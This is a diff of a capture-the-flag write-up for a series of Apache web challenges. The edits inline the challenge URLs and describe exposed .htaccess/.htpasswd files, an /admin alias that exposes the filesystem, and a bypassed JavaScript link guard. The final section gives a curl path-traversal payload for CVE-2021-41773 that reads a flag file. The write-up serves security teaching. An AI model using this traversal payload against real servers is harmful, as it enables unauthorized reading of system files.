@@ -267,7 +267,7 @@ This script returns the flag: `SIG{1337_h4xx0r}`
 
 ### Apache Semester 1
 
-we have to find all hidden exam questions. the first one is linked in the HTML and not hard to find:
+we have to find all hidden exam questions. the first one is linked in the HTML and not hard to find: `http://game.sigflag.at:3071/questions.txt`
 
 ```
 <h1>1 Semester Exam Questions</h1>
@@ -275,22 +275,14 @@ we have to find all hidden exam questions. the first one is linked in the HTML a
 <a href="questions.txt">questions.txt</a>
 ```
 
-```
-http://game.sigflag.at:3071/questions.txt
-```
-
 ### Apache Semester 2
 
-the second set of questions can be accessed by clicking on the link in the DevTools, bypassing the script.
+the second set of questions can be accessed by clicking on the link in the DevTools (`http://game.sigflag.at:3072/harder-questions.txt`), bypassing the script.
 
 ```
 <h1>2 Semester Exam Questions</h1>
 
 <a href="harder-questions.txt" onclick="alert('You are not supposed to access this!'); return false;">Questions</a>
-```
-
-```
-http://game.sigflag.at:3072/harder-questions.txt
 ```
 
 
@@ -310,6 +302,8 @@ File last edited: 21.09.2005
 
 
 ### Apache Semester 4
+
+both `.htaccess` and `.htpasswd` were exposed:
 
 `https://game.sigflag.at:3084/exam/.htaccess`:
 
@@ -343,9 +337,7 @@ This is the hint we have:
 Alias /admin /
 ```
 
-```
-http://game.sigflag.at:3075/admin/opt/well_hidden_questions.txt
-```
+we can browse the file system by going to `http://game.sigflag.at:3075/admin` and eventually find the questions here: `http://game.sigflag.at:3075/admin/opt/well_hidden_questions.txt`
 
 ### Apache Semester 6
 
@@ -370,7 +362,7 @@ The questions could be found at `http://game.sigflag.at:3076/exam/questions.txt`
 
 ### Apache Semester 7
 
-the hint given was `CVE-2021-41773`
+the hint given was `CVE-2021-41773` - a search online revealed ways exploit it
 
 ```bash
 curl "https://game.sigflag.at:3087/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/home/bpfh/flag.txt" --insecure --path-as-is  
